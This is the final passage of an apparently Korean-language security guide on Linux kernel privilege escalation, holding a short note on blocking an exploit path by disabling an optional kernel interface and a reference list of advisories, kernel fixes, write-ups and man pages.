이러한 유형의 완화책은 다른 kernel LPE에서도 기억해 둘 만합니다. 공격이 특정 optional interface에 의존한다면, 해당 interface를 비활성화하거나 blacklist에 추가하는 것만으로도 전체 kernel 업그레이드가 가능해지기 전에 exploit 경로를 차단할 수 있습니다.<sup>[[6]](#references)[[28]](#references)</sup>



## References

- [1] [HTB Bamboo – 사용자 쓰기 가능 PaperCut 디렉터리에서 root 권한으로 실행되는 스크립트 탈취](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [CVE-2026-31431에 관한 Openwall oss-security 공개](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Linux stable 수정: crypto: algif_aead - out-of-place 동작으로 되돌리기](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — CVE-2026-31431 권고문](https://copy.fail/)
- [7] [Theori / Xint 기술 분석 글](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [DirtyClone 저장소 / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: Linux LPE 변종 DirtyClone (CVE-2026-43503) 분석 및 exploit](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Linux 수정: net: skb: `__pskb_copy_fclone()`에서 `SKBFL_SHARED_FRAG` 보존 (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Linux 이전 완화책: splice된 UDP 패킷에 `SKBFL_SHARED_FRAG` 설정 (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — Debian 매뉴얼 페이지](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — Linux Kernel 문서](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [MIME 애플리케이션 연결](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Shared MIME-info 명세](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Desktop Entry 명세](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Kconfig 언어](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Linux crypto Makefile](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: Linux kernel AF_ALG 페이지 캐시 취약점](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Git `hash-object` 문서](https://git-scm.com/docs/git-hash-object)
- [32] [Git `ls-tree` 문서](https://git-scm.com/docs/git-ls-tree)
- [33] [Git 구성 문서](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man2/openat2.2.html)
- [35] [systemd generator 문서](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
- [36] [Elastic Security Labs — Linux 탐지 엔지니어링: 지속성 메커니즘](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
{{#include ../../banners/hacktricks-training.md}}
